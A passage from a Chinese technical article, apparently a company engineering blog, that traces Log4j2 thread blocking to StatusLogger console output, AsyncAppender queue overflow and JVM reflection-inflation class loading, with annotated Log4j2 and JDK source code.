StatusConsoleListener(final Level level, final PrintStream stream) {\n    if (stream == null) {\n        throw new IllegalArgumentException(\"You must provide a stream to use for this listener.\");\n    }\n    this.level = level;\n    this.stream = stream;\n}\n</code></pre><p>以XmlConfiguration为例，分析上述日志配置解析代码片段可以得知，创建XmlConfiguration时，会先创建StatusConfiguration，随后在初始化StatusConfiguration时创建并注册StatusConsoleListener到StatusLogger的listeners中，日志配置文件中&lt;Configuration&gt;标签的属性值通过XmlConfiguration-&gt;StatusConfiguration-&gt;StatusConsoleListener这样的关系链路最终影响StatusConsoleListener的行为。</p><p>日志配置文件中的&lt;Configuration&gt;标签可以配置属性字段，部分字段如下所示：</p><ul><li><strong>status</strong>，可选值包括<strong>OFF、FATAL、ERROR、WARN、INFO、DEBUG、TRACE、ALL</strong>，该值决定StatusConsoleListener级别，默认是ERROR。</li><li><strong>dest</strong>，可选值包括<strong>out、err、标准的URI路径</strong>，该值决定StatusConsoleListener输出流目的地，默认是System.out。<br></li></ul><p>在本项目的日志配置文件中可以看到并没有设置Configuration的dest属性值，所以日志直接输出到System.out。</p><h4>3.1.5 StatusLogger有什么用？</h4><p>上文提到StatusConsoleListener是注册在StatusLogger中，StatusLogger在交由StatusListener处理日志前，会判断日志级别，如果级别条件不满足，则忽略此日志，StatusConsoleListener的日志级别默认是ERROR。</p><pre><code>// org.apache.logging.log4j.status.StatusLogger\n  \n@Override\npublic void logMessage(final String fqcn, final Level level, final Marker marker, final Message msg,\n        final Throwable t) {\n    StackTraceElement element = null;\n    if (fqcn != null) {\n        element = getStackTraceElement(fqcn, Thread.currentThread().getStackTrace());\n    }\n    final StatusData data = new StatusData(element, level, msg, t, null);\n    msgLock.lock();\n    try {\n        messages.add(data);\n    } finally {\n        msgLock.unlock();\n    }\n  \n  // 系统注册了 listener，由 StatusConsoleListener 处理日志\n    if (listeners.size() &gt; 0) {\n        for (final StatusListener listener : listeners) {\n          // 比较当前日志的 leve 和 listener 的 level\n            if (data.getLevel().isMoreSpecificThan(listener.getStatusLevel())) {\n                listener.log(data);\n            }\n        }\n    } else {\n        logger.logMessage(fqcn, level, marker, msg, t);\n    }\n}\n</code></pre><p>我们回头再来看下StatusLogger，StatusLogger采用单例模式实现，它输出日志到Console（如System.out或System.err），从上文分析可知，在高并发场景下非常容易导致线程Block，那么它的存在有什么意义呢？</p><p>看官方介绍大意是说，在日志初始化完成前，也有打印日志调试的需求，StatusLogger就是为了解决这个问题而生。</p><blockquote><p><strong>Troubleshooting tip for the impatient:</strong></p><p>From log4j-2.9 onward, log4j2 will print all internal logging to the console if system property log4j2.debug is defined (with any or no value).</p><p>Prior to log4j-2.9, there are two places where internal logging can be controlled:</p><ul><li>Before a configuration is found, status logger level can be controlled with system property org.apache.logging.log4j.simplelog.StatusLogger.level.</li><li>After a configuration is found, status logger level can be controlled in the configuration file with the “status” attribute, for example: &lt;Configuration status=“trace”&gt;.</li></ul><p>Just as it is desirable to be able to diagnose problems in applications, it is frequently necessary to be able to diagnose problems in the logging configuration or in the configured components. Since logging has not been configured, “normal” logging cannot be used during initialization. In addition, normal logging within appenders could create infinite recursion which Log4j will detect and cause the recursive events to be ignored. To accomodate this need, the Log4j 2 API includes a <a href=\"https://logging.apache.org/log4j/2.x/log4j-api/apidocs/org/apache/logging/log4j/status/StatusLogger.html\">StatusLogger</a>.</p></blockquote><h4>3.1.6 问题小结</h4><p>日志量过大导致AsyncAppender日志队列被打满，新的日志事件无法入队，进而由ErrorHandler处理日志，同时由于ErrorHandler存在线程安全问题，导致大量日志输出到了Console，而Console在输出日志到PrintStream输出流时，存在synchronized同步代码块，所以在高并发场景下导致线程Block。</p><h3>3.2 AsyncAppender导致线程Block</h3><h4>3.2.1 问题现场</h4><p>收到“jvm.thread.blocked.count”告警后立刻通过监控平台查看线程监控指标，当时的线程堆栈如下图6和图7所示。</p><p><img src=\"https://p1.meituan.net/travelcube/8e78a5cadf68a29fc1bb4ccddf6266ee709820.png\" alt=\"图6 等待锁的Blocked线程堆栈\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/0fd6af77194b20c73cc083639665bc25548374.png\" alt=\"图7 持有锁的Runnable线程堆栈\" referrerpolicy=\"no-referrer\"></p><p>从Blocked线程堆栈不难看出是跟日志打印相关，由于是ERROR级别日志，查看具体报错日志，发现有两种业务异常，分别如下图8和图9所示：</p><p><img src=\"https://p1.meituan.net/travelcube/ef3f3120108556796f687feaf53934e51119018.png\" alt=\"图8 业务异常堆栈一\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/393ec805f1e5fe4f6cf0b51150c798f01224638.png\" alt=\"图9 业务异常堆栈二\" referrerpolicy=\"no-referrer\"></p><p>这些业务异常会是导致线程Block的幕后元凶吗？接下来本章节将结合如下图10所示的调用链路深入分析线程Block的根因。</p><p><img src=\"https://p0.meituan.net/travelcube/e982a7c27d1c1e04b23ffed5f7589344116902.png\" alt=\"图10 日志调用链路\" referrerpolicy=\"no-referrer\"></p><h4>3.2.2 为什么会Block线程？</h4><p>从Blocked线程堆栈中可以看出，线程阻塞在类加载流程上，查看WebAppClassLoader相关代码片段如下图11所示，发现加载类时确实会根据类名来加synchronized同步块，因此初步猜测是类加载导致线程Block。</p><p><img src=\"https://p1.meituan.net/travelcube/86d456589c866d103feb835d4cf19045163097.png\" alt=\"图11 WebAppClassLoader\" referrerpolicy=\"no-referrer\"></p><p>但上述猜测还有一些值得推敲的地方：</p><ol><li>项目代码里只是普通地输出一条ERROR日志而已，为何会触发类加载？</li><li>通常情况下类加载几乎不会触发线程Block，不然一个项目要加载成千上万个类，如果因为加载类就导致Block，那项目就没法正常运行了。<br></li></ol><h4>3.2.3 为什么会触发类加载？</h4><p>继续从Blocked线程堆栈着手分析，查看堆栈中的ThrowableProxy相关代码，发现其构造函数会遍历整个异常堆栈中的所有堆栈元素，最终获取所有堆栈元素类所在的JAR名称和版本信息。具体流程如下：</p><ol><li>首先获取堆栈元素的类名称。</li><li>再通过loadClass的方式获取对应的Class对象。</li><li>进一步获取该类所在的JAR信息，从CodeSource中获取JAR名称，从Package中获取JAR版本。<br></li></ol><pre><code>// org.apache.logging.log4j.core.impl.ThrowableProxy\n  \nprivate ThrowableProxy(final Throwable throwable, final Set&lt;Throwable&gt; visited) {\n    this.throwable = throwable;\n    this.name = throwable.getClass().getName();\n    this.message = throwable.getMessage();\n    this.localizedMessage = throwable.getLocalizedMessage();\n    final Map&lt;String, CacheEntry&gt; map = new HashMap&lt;&gt;();\n    final Stack&lt;Class&lt;?&gt;&gt; stack = ReflectionUtil.getCurrentStackTrace();\n  // 获取堆栈扩展信息\n    this.extendedStackTrace = this.toExtendedStackTrace(stack, map, null, throwable.getStackTrace());\n    final Throwable throwableCause = throwable.getCause();\n    final Set&lt;Throwable&gt; causeVisited = new HashSet&lt;&gt;(1);\n    this.causeProxy = throwableCause == null ? null : new ThrowableProxy(throwable, stack, map, throwableCause,\n        visited, causeVisited);\n    this.suppressedProxies = this.toSuppressedProxies(throwable, visited);\n}\n\nExtendedStackTraceElement[] toExtendedStackTrace(final Stack&lt;Class&lt;?&gt;&gt; stack, final Map&lt;String, CacheEntry&gt; map,\n                                                 final StackTraceElement[] rootTrace,\n                                                 final StackTraceElement[] stackTrace) {\n    int stackLength;\n    if (rootTrace != null) {\n        int rootIndex = rootTrace.length - 1;\n        int stackIndex = stackTrace.length - 1;\n        while (rootIndex &gt;= 0 &amp;&amp; stackIndex &gt;= 0 &amp;&amp; rootTrace[rootIndex].equals(stackTrace[stackIndex])) {\n            --rootIndex;\n            --stackIndex;\n        }\n        this.commonElementCount = stackTrace.length - 1 - stackIndex;\n        stackLength = stackIndex + 1;\n    } else {\n        this.commonElementCount = 0;\n        stackLength = stackTrace.length;\n    }\n    final ExtendedStackTraceElement[] extStackTrace = new ExtendedStackTraceElement[stackLength];\n    Class&lt;?&gt; clazz = stack.isEmpty() ? null : stack.peek();\n    ClassLoader lastLoader = null;\n    for (int i = stackLength - 1; i &gt;= 0; --i) {\n      // 遍历 StackTraceElement\n        final StackTraceElement stackTraceElement = stackTrace[i];\n      // 获取堆栈元素对应的类名称\n        final String className = stackTraceElement.getClassName();\n        // The stack returned from getCurrentStack may be missing entries for java.lang.reflect.Method.invoke()\n        // and its implementation. The Throwable might also contain stack entries that are no longer\n        // present as those methods have returned.\n        ExtendedClassInfo extClassInfo;\n        if (clazz != null &amp;&amp; className.equals(clazz.getName())) {\n            final CacheEntry entry = this.toCacheEntry(stackTraceElement, clazz, true);\n            extClassInfo = entry.element;\n            lastLoader = entry.loader;\n            stack.pop();\n            clazz = stack.isEmpty() ? null : stack.peek();\n        } else {\n          // 对加载过的 className 进行缓存，避免重复加载\n            final CacheEntry cacheEntry = map.get(className);\n            if (cacheEntry != null) {\n                final CacheEntry entry = cacheEntry;\n                extClassInfo = entry.element;\n                if (entry.loader != null) {\n                    lastLoader = entry.loader;\n                }\n            } else {\n              // 通过加载类来获取类的扩展信息，如 location 和 version 等\n                final CacheEntry entry = this.toCacheEntry(stackTraceElement,\n                    // 获取 Class 对象\n                    this.loadClass(lastLoader, className), false);\n                extClassInfo = entry.element;\n                map.put(stackTraceElement.toString(), entry);\n                if (entry.loader != null) {\n                    lastLoader = entry.loader;\n                }\n            }\n        }\n        extStackTrace[i] = new ExtendedStackTraceElement(stackTraceElement, extClassInfo);\n    }\n    return extStackTrace;\n}\n\n/**\n * Construct the CacheEntry from the Class's information.\n *\n * @param stackTraceElement The stack trace element\n * @param callerClass       The Class.\n * @param exact             True if the class was obtained via Reflection.getCallerClass.\n * @return The CacheEntry.\n */\nprivate CacheEntry toCacheEntry(final StackTraceElement stackTraceElement, final Class&lt;?&gt; callerClass,\n                                final boolean exact) {\n    String location = \"?\";\n    String version = \"?\";\n    ClassLoader lastLoader = null;\n    if (callerClass != null) {\n        try {\n            // 获取 jar 文件信息\n            final CodeSource source = callerClass.getProtectionDomain().getCodeSource();\n            if (source != null) {\n                final URL locationURL = source.getLocation();\n                if (locationURL != null) {\n                    final String str = locationURL.toString().replace('\\\\', '/');\n                    int index = str.lastIndexOf(\"/\");\n                    if (index &gt;= 0 &amp;&amp; index == str.length() - 1) {\n                        index = str.lastIndexOf(\"/\", index - 1);\n                        location = str.substring(index + 1);\n                    } else {\n                        location = str.substring(index + 1);\n                    }\n                }\n            }\n        } catch (final Exception ex) {\n            // Ignore the exception.\n        }\n    // 获取类所在 jar 版本信息\n        final Package pkg = callerClass.getPackage();\n        if (pkg != null) {\n            final String ver = pkg.getImplementationVersion();\n            if (ver != null) {\n                version = ver;\n            }\n        }\n        lastLoader = callerClass.getClassLoader();\n    }\n    return new CacheEntry(new ExtendedClassInfo(exact, location, version), lastLoader);\n}\n</code></pre><p>从上述代码中可以看到，ThrowableProxy#toExtendedStackTrace方法通过Map<string cacheentry=\"\">缓存当前堆栈元素类对应的CacheEntry，来避免重复解析CacheEntry，但是由于Map缓存put操作使用的key来自于StackTraceElement.toString方法，而get操作使用的key却来自于StackTraceElement.getClassName方法，即使对于同一个StackTraceElement而言，其toString和getClassName方法对应的返回结果也不一样，所以此map形同虚设。</string>,&gt;</p><pre><code>// java.lang.StackTraceElement\n  \npublic String getClassName() {\n    return declaringClass;\n}\n\npublic String toString() {\n    return getClassName() + \".\" + methodName +\n        (isNativeMethod() ? \"(Native Method)\" :\n         (fileName != null &amp;&amp; lineNumber &gt;= 0 ?\n          \"(\" + fileName + \":\" + lineNumber + \")\" :\n          (fileName != null ?  \"(\"+fileName+\")\" : \"(Unknown Source)\")));\n}\n</code></pre><p>该问题已有相关<a href=\"https://issues.apache.org/jira/browse/LOG4J2-2389\">Issue: fix the CacheEntry map in ThrowableProxy#toExtendedStackTrace to be put and gotten with same key</a>反馈给社区，并在<a href=\"https://logging.apache.org/log4j/2.x/changes-report.html#a2.11.1\">2.11.1</a>版本中修复了该问题。虽然通过让get/put方法使用同一个key来修复缓存的有效性问题，但由于ThrowableProxy对每个Throwable都会创建一个全新的Map，而不是使用全局Map，因此其缓存也仅仅对单个Throwable生效，作用范围非常有限，食之无味，弃之可惜。</p><p>言归正传，通常情况下一个类加载器对于一个类只会加载一次，类加载器内部保存有类缓存，无需重复加载，但目前的现象却是由于类加载而导致线程大量Block，因此必然是有些类加载不了，且不断重复尝试加载，那到底是什么类无法加载呢？</p><h4>3.2.4 到底什么类加载不了？</h4><p>要找到具体是什么类无法加载，归根结底还是要分析业务异常的具体堆栈。</p><p><img src=\"https://p1.meituan.net/travelcube/ef3f3120108556796f687feaf53934e51119018.png\" alt=\"图12 业务异常堆栈一\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/393ec805f1e5fe4f6cf0b51150c798f01224638.png\" alt=\"图13 业务异常堆栈二\" referrerpolicy=\"no-referrer\"></p><p>对比如图12和图13所示的两份业务异常堆栈，我们可以看到两份堆栈基本相似，且大多数类都是很普通的类，但是唯一不同的地方在于：</p><ol><li>sun.reflect.NativeMethodAccessorImpl（参见图12）。</li><li>sun.reflect.GeneratedMethodAccessor261（参见图13）。</li></ol><p>从字面信息中不难猜测出这与反射调用相关，但问题是这两份堆栈对应的其实是同一份业务代码，为什么会产生两份不同的异常堆栈？</p><p>查阅相关资料得知，这与JVM反射调用相关，JVM对反射调用分两种情况：</p><ol><li><strong>默认使用native方法进行反射操作。</strong></li><li><strong>一定条件下会生成字节码进行反射操作</strong>，即生成sun.reflect.GeneratedMethodAccessor&lt;N&gt;类，它是一个反射调用方法的包装类，代理不同的方法，类后缀序号递增。</li></ol><p>JVM反射调用的主要流程是获取MethodAccessor，并由MethodAccessor执行invoke调用，相关代码如下：</p><pre><code>// java.lang.reflect.Method  \n\n@CallerSensitive\npublic Object invoke(Object obj, Object... args)\n    throws IllegalAccessException, IllegalArgumentException,\n       InvocationTargetException\n{\n    if (!override) {\n        if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) {\n            Class&lt;?&gt; caller = Reflection.getCallerClass();\n            checkAccess(caller, clazz, obj, modifiers);\n        }\n    }\n\n    MethodAccessor ma = methodAccessor;             // read volatile\n    if (ma == null) {\n    // 获取 MethodAccessor\n        ma = acquireMethodAccessor();\n    }\n    // 通过 MethodAccessor 调用\n    return ma.invoke(obj, args);\n}\n\nprivate MethodAccessor acquireMethodAccessor() {\n    MethodAccessor tmp = null;\n    if (root != null) tmp = root.getMethodAccessor();\n    if (tmp != null) {\n        methodAccessor = tmp;\n    } else {\n        // 通过 ReflectionFactory 创建 MethodAccessor\n        tmp = reflectionFactory.newMethodAccessor(this);\n        setMethodAccessor(tmp);\n    }\n\n    return tmp;\n}\n</code></pre><p>当noInflation为false（默认为false）或者反射方法所在类是VM匿名类（类名中包括斜杠“/”）的情况下，ReflectionFactory会返回一个MethodAccessor代理类，即DelegatingMethodAccessorImpl。</p><pre><code>// sun.reflect.ReflectionFactory\n\npublic MethodAccessor newMethodAccessor(Method method) {\n  // 通过启动参数获取并解析 noInflation 和 inflationThreshold 值\n  // noInflation 默认为 false\n  // inflationThreshold 默认为15\n    checkInitted();\n\n    if (noInflation &amp;&amp; !ReflectUtil.isVMAnonymousClass(method.getDeclaringClass())) {\n        return new MethodAccessorGenerator().\n            generateMethod(method.getDeclaringClass(),\n                           method.getName(),\n                           method.getParameterTypes(),\n                           method.getReturnType(),\n                           method.getExceptionTypes(),\n                           method.getModifiers());\n    } else {\n        NativeMethodAccessorImpl acc =\n            new NativeMethodAccessorImpl(method);\n        DelegatingMethodAccessorImpl res =\n            new DelegatingMethodAccessorImpl(acc);\n        acc.setParent(res);\n      \n      // 返回代理 DelegatingMethodAccessorImpl\n        return res;\n    }\n}\n\nprivate static void checkInitted() {\n    if (initted) return;\n    AccessController.doPrivileged(\n        new PrivilegedAction&lt;Void&gt;() {\n            public Void run() {\n                // Tests to ensure the system properties table is fully\n                // initialized. This is needed because reflection code is\n                // called very early in the initialization process (before\n                // command-line arguments have been parsed and therefore\n                // these user-settable properties installed.) We assume that\n                // if System.out is non-null then the System class has been\n                // fully initialized and that the bulk of the startup code\n                // has been run.\n\n                if (System.out == null) {\n                    // java.lang.System not yet fully initialized\n                    return null;\n                }\n\n                String val = System.getProperty(\"sun.reflect.noInflation\");\n                if (val != null &amp;&amp; val.equals(\"true\")) {\n                    noInflation = true;\n                }\n\n                val = System.getProperty(\"sun.reflect.inflationThreshold\");\n                if (val != null) {\n                    try {\n                        inflationThreshold = Integer.parseInt(val);\n                    } catch (NumberFormatException e) {\n                        throw new RuntimeException(\"Unable to parse property sun.reflect.inflationThreshold\", e);\n                    }\n                }\n\n                initted = true;\n                return null;\n            }\n        });\n}\n</code></pre><p>默认情况下DelegatingMethodAccessorImpl代理了NativeMethodAccessorImpl，但是随着反射调用次数的增加，当一个方法被反射调用的次数超过一定的阀值时（inflationThreshold，默认值是15），NativeMethodAccessorImpl会通过字节码生成技术，自动生成MethodAccessorImpl实现类，并修改DelegatingMethodAccessorImpl的内部代理对象指向字节码生成类实例，从而改变后续反射调用逻辑。</p><p><img src=\"https://p0.meituan.net/travelcube/f28797d5570b64848517572244bd6f0987974.png\" alt=\"图14 MethodAccessor关系图\" referrerpolicy=\"no-referrer\"></p><pre><code>// sun.reflect.DelegatingMethodAccessorImpl\n\nclass DelegatingMethodAccessorImpl extends MethodAccessorImpl {\n  // 内部代理 MethodAccessorImpl\n    private MethodAccessorImpl delegate;\n\n    DelegatingMethodAccessorImpl(MethodAccessorImpl delegate) {\n        setDelegate(delegate);\n    }\n\n    public Object invoke(Object obj, Object[] args)\n        throws IllegalArgumentException, InvocationTargetException\n    {\n        return delegate.invoke(obj, args);\n    }\n\n    void setDelegate(MethodAccessorImpl delegate) {\n        this.delegate = delegate;\n    }\n}\n</code></pre><pre><code>// sun.reflect.NativeMethodAccessorImpl\n\nclass NativeMethodAccessorImpl extends MethodAccessorImpl {\n    private final Method method;\n    private DelegatingMethodAccessorImpl parent;\n    private int numInvocations;\n\n    NativeMethodAccessorImpl(Method method) {\n        this.method = method;\n    }\n\n    public Object invoke(Object obj, Object[] args)\n        throws IllegalArgumentException, InvocationTargetException\n    {\n        // We can't inflate methods belonging to vm-anonymous classes because\n        // that kind of class can't be referred to by name, hence can't be\n        // found from the generated bytecode.\n      \n      // 每次调用时 numInvocations 都会自增加1，如果超过阈值（默认是15次），就会修改父类的代理对象，从而改变调用链路\n        if (++numInvocations &gt; ReflectionFactory.inflationThreshold()\n                &amp;&amp; !ReflectUtil.isVMAnonymousClass(method.getDeclaringClass())) {\n            MethodAccessorImpl acc = (MethodAccessorImpl)\n              // 动态生成字节码，优化反射调用速度\n                new MethodAccessorGenerator().\n                    generateMethod(method.getDeclaringClass(),\n                                   method.getName(),\n                                   method.getParameterTypes(),\n                                   method.getReturnType(),\n                                   method.getExceptionTypes(),\n                                   method.getModifiers());\n          // 修改父代理类的代理对象\n            parent.setDelegate(acc);\n        }\n\n        return invoke0(method, obj, args);\n    }\n\n    void setParent(DelegatingMethodAccessorImpl parent) {\n        this.parent = parent;\n    }\n\n    private static native Object invoke0(Method m, Object obj, Object[] args);\n}\n</code></pre><p>从MethodAccessorGenerator#generateName方法可以看到，字节码生成的类名称规则是sun.reflect.GeneratedConstructorAccessor&lt;N&gt;，其中N是从0开始的递增数字，且生成类是由DelegatingClassLoader类加载器定义，所以其他类加载器无法加载该类，也就无法生成类缓存数据，从而导致每次加载类时都需要遍历JarFile，极大地降低了类查找速度，且类加载过程是synchronized同步调用，在高并发情况下会更加恶化，从而导致线程Block。</p><pre><code>// sun.reflect.MethodAccessorGenerator\n\npublic MethodAccessor generateMethod(Class&lt;?&gt; declaringClass,\n                                     String   name,\n                                     Class&lt;?&gt;[] parameterTypes,\n                                     Class&lt;?&gt;   returnType,\n                                     Class&lt;?&gt;[] checkedExceptions,\n                                     int modifiers)\n{\n    return (MethodAccessor) generate(declaringClass,\n                                     name,\n                                     parameterTypes,\n                                     returnType,\n                                     checkedExceptions,\n                                     modifiers,\n                                     false,\n                                     false,\n                                     null);\n}\n\nprivate MagicAccessorImpl generate(final Class&lt;?&gt; declaringClass,\n                                   String name,\n                                   Class&lt;?&gt;[] parameterTypes,\n                                   Class&lt;?&gt;   returnType,\n                                   Class&lt;?&gt;[] checkedExceptions,\n                                   int modifiers,\n                                   boolean isConstructor,\n                                   boolean forSerialization,\n                                   Class&lt;?&gt; serializationTargetClass)\n{\n  \n  final String generatedName = generateName(isConstructor, forSerialization);\n\n    // 忽略以上代码\n\n    return AccessController.doPrivileged(\n        new PrivilegedAction&lt;MagicAccessorImpl&gt;() {\n            public MagicAccessorImpl run() {\n                    try {\n                    return (MagicAccessorImpl)\n                    ClassDefiner.defineClass\n                            (generatedName,\n                             bytes,\n                             0,\n                             bytes.length,\n                             declaringClass.getClassLoader()).newInstance();\n                    } catch (InstantiationException | IllegalAccessException e) {\n                        throw new InternalError(e);\n                    }\n                }\n            });\n}\n\n// 生成反射类名，看到了熟悉的 sun.reflect.GeneratedConstructorAccessor&lt;N&gt;\nprivate static synchronized String generateName(boolean isConstructor, boolean forSerialization)\n{\n    if (isConstructor) {\n        if (forSerialization) {\n            int num = ++serializationConstructorSymnum;\n            return \"sun/reflect/GeneratedSerializationConstructorAccessor\" + num;\n        } else {\n            int num = ++constructorSymnum;\n            return \"sun/reflect/GeneratedConstructorAccessor\" + num;\n        }\n    } else {\n        int num = ++methodSymnum;\n        return \"sun/reflect/GeneratedMethodAccessor\" + num;\n    }\n}\n</code></pre><pre><code>// sun.reflect.ClassDefiner\n  \nstatic Class&lt;?&gt; defineClass(String name, byte[] bytes, int off, int len,\n                            final ClassLoader parentClassLoader)\n{\n    ClassLoader newLoader = AccessController.doPrivileged(\n        new PrivilegedAction&lt;ClassLoader&gt;() {\n            public ClassLoader run() {\n                    return new DelegatingClassLoader(parentClassLoader);\n                }\n            });\n  // 通过 DelegatingClassLoader 类加载器定义生成类\n    return unsafe.defineClass(name, bytes, off, len, newLoader, null);\n}\n</code></pre><p>那么，JVM反射调用为什么要做这么做？</p><p>其实这是JVM对反射调用的一种优化手段，在sun.reflect.ReflectionFactory的文档注释里对此做了解释，这是一种“Inflation”机制，加载字节码的调用方式在第一次调用时会比Native调用的速度要慢3~4倍，但是在后续调用时会比Native调用速度快20多倍。为了避免反射调用影响应用的启动速度，所以在反射调用的前几次通过Native方式调用，当超过一定调用次数后使用字节码方式调用，提升反射调用性能。</p><blockquote><p>“Inflation” mechanism. Loading bytecodes to implement Method.invoke() and Constructor.newInstance() currently costs 3-4x more than an invocation via native code for the first invocation (though subsequent invocations have been benchmarked to be over 20x faster). Unfortunately this cost increases startup time for certain applications that use reflection intensively (but only once per class) to bootstrap themselves. To avoid this penalty we reuse the existing JVM entry points for the first few invocations of Methods and Constructors and then switch to the bytecode-based implementations.</p></blockquote><p>至此，总算理清了类加载导致线程Block的直接原因，但这并非根因，业务代码中普普通通地打印一条ERROR日志，为何会导致解析、加载异常堆栈类？</p><h4>3.2.5 为什么要解析异常堆栈？</h4><p><img src=\"https://p0.meituan.net/travelcube/4f4770a5ed066759870da258d2ef7f9393118.png\" alt=\"图15 AsyncAppender处理日志流程\" referrerpolicy=\"no-referrer\"></p><p>AsyncAppender处理日志简要流程如上图15所示，在其内部维护一个BlockingQueue队列和一个AsyncThread线程，处理日志时先把日志转换成Log4jLogEvent快照然后入队，同时AsyncThread线程负责从队列里获取元素来异步处理日志事件。</p><pre><code>// org.apache.logging.log4j.core.appender.AsyncAppender\n\n@Override\npublic void append(final LogEvent logEvent) {\n    if (!isStarted()) {\n        throw new IllegalStateException(\"AsyncAppender \" + getName() + \" is not active\");\n    }\n    if (!Constants.FORMAT_MESSAGES_IN_BACKGROUND) { // LOG4J2-898: user may choose\n        logEvent.getMessage().getFormattedMessage(); // LOG4J2-763: ask message to freeze parameters\n    }\n  // 创建 日志数据快照\n    final Log4jLogEvent memento = Log4jLogEvent.createMemento(logEvent, includeLocation);\n  // 放入 BlockingQueue 中\n    if (!transfer(memento)) {\n        if (blocking) {\n            // delegate to the event router (which may discard, enqueue and block, or log in current thread)\n            final EventRoute route = asyncQueueFullPolicy.getRoute(thread.getId(), memento.getLevel());\n            route.logMessage(this, memento);\n        } else {\n            error(\"Appender \" + getName() + \" is unable to write primary appenders. queue is full\");\n            logToErrorAppenderIfNecessary(false, memento);\n        }\n    }\n}\n</code></pre><p>AsyncAppender在生成LogEvent的快照Log4jLogEvent时，会先对LogEvent序列化处理统一转换为LogEventProxy，此时不同类型的LogEvent的处理情况稍有差异：</p><ul><li><strong>Log4jLogEvent类型</strong>，先执行Log4jLogEvent#getThrownProxy方法，触发创建ThrowableProxy实例。</li><li><strong>MutableLogEvent类型</strong>，先创建LogEventProxy实例，在构造函数内执行MutableLogEvent#getThrownProxy方法，触发创建ThrowableProxy实例。</li></ul><p>综上，不管LogEvent的实际类型是MutableLogEvent还是Log4jLogEvent，最终都会触发创建ThrowableProxy实例，并在ThrowableProxy构造函数内触发了解析、加载异常堆栈类。</p><pre><code>// org.apache.logging.log4j.core.impl.Log4jLogEvent\n\n// 生成Log4jLogEvent快照\npublic static Log4jLogEvent createMemento(final LogEvent event, final boolean includeLocation) {\n    // TODO implement Log4jLogEvent.createMemento()\n    return deserialize(serialize(event, includeLocation));\n}\n\npublic static Serializable serialize(final LogEvent event, final boolean includeLocation) {\n    if (event instanceof Log4jLogEvent) {\n      // 确保 ThrowableProxy 已完成初始化\n        event.getThrownProxy(); // ensure ThrowableProxy is initialized\n      // 创建 LogEventProxy\n        return new LogEventProxy((Log4jLogEvent) event, includeLocation);\n    }\n  // 创建 LogEventProxy\n    return new LogEventProxy(event, includeLocation);\n}\n\n@Override\npublic ThrowableProxy getThrownProxy() {\n    if (thrownProxy == null &amp;&amp; thrown != null) {\n        thrownProxy = new ThrowableProxy(thrown);\n    }\n    return thrownProxy;\n}\n\npublic LogEventProxy(final LogEvent event, final boolean includeLocation) {\n    this.loggerFQCN = event.getLoggerFqcn();\n    this.marker = event.getMarker();\n    this.level = event.getLevel();\n    this.loggerName = event.getLoggerName();\n\n    final Message msg = event.getMessage();\n    this.message = msg instanceof ReusableMessage\n            ? memento((ReusableMessage) msg)\n            : msg;\n    this.timeMillis = event.getTimeMillis();\n    this.thrown = event.getThrown();\n  // 创建 ThrownProxy 实例\n    this.thrownProxy = event.getThrownProxy();\n    this.contextData = memento(event.getContextData());\n    this.contextStack = event.getContextStack();\n    this.source = includeLocation ? event.getSource() : null;\n    this.threadId = event.getThreadId();\n    this.threadName = event.getThreadName();\n    this.threadPriority = event.getThreadPriority();\n    this.isLocationRequired = includeLocation;\n    this.isEndOfBatch = event.isEndOfBatch();\n    this.nanoTime = event.getNanoTime();\n}\n</code></pre><pre><code>// org.apache.logging.log4j.core.impl.MutableLogEvent\n\n@Override\npublic ThrowableProxy getThrownProxy() {\n    if (thrownProxy == null &amp;&amp; thrown != null) {\n      // 构造 ThrowableProxy 时打印异常堆栈\n        thrownProxy = new ThrowableProxy(thrown);\n    }\n    return thrownProxy;\n}\n</code></pre><h4>3.2.6 问题小结</h4><p>Log4j2打印异常日志时，AsyncAppender会先创建日志事件快照，并进一步触发解析、加载异常堆栈类。JVM通过生成字节码的方式优化反射调用性能，但该动态生成的类无法被WebAppClassLoader类加载器加载，因此当大量包含反射调用的异常堆栈被输出到日志时，会频繁地触发类加载，由于类加载过程是synchronized同步加锁的，且每次加载都需要读取文件，速度较慢，从而导致线程Block。</p><h3>3.3 Lambda表达式导致线程Block</h3><h4>3.3.1 问题现场</h4><p>收到“jvm.thread.blocked.count”告警后，立刻通过监控平台查看线程监控指标，当时的线程堆栈如下图16和图17所示：</p><p><img src=\"https://p1.meituan.net/travelcube/2bff1fa248a8fc9dcd89f0a441108e4d500067.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/9f352aa0ba4c7b2ae38096885d4a458f553933.png\" alt=\"图16 等待锁的Blocked线程堆栈\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/990819413a03aceb4b34164d5ee87774450882.png\" alt=\"图17 持有锁的Runnable线程堆栈\" referrerpolicy=\"no-referrer\"></p><p>从Blocked线程堆栈不难看出是和日志打印相关，由于是ERROR级别日志，查看具体报错日志，发现如下图18所示的业务异常。</p><p><img src=\"https://p0.meituan.net/travelcube/9d5b8363081d217dcdabc7ae37e0e5361540873.png\" alt=\"图18 业务异常堆栈\" referrerpolicy=\"no-referrer\"></p><p>本案例的Blocked线程堆栈和上述“AsyncAppender导致线程Block”案例一样，那么导致线程Block的罪魁祸首会是业务异常吗？接下来本章节将结合下图19所示的调用链路深入分析线程Block的根因。</p><p><img src=\"https://p0.meituan.net/travelcube/e982a7c27d1c1e04b23ffed5f7589344116902.png\" alt=\"图19 日志调用链路\" referrerpolicy=\"no-referrer\"></p><h4>3.3.2 为什么会Block线程？</h4><p>从Blocked线程堆栈中可以看出，线程阻塞在类加载上，该线程堆栈和上述“AsyncAppender导致线程Block”案例相似，这里不再重复分析。</p><h4>3.3.3 为什么会触发类加载？</h4><p>原因和上述“AsyncAppender导致线程Block”案例相似，这里不再重复分析。</p><h4>3.3.4 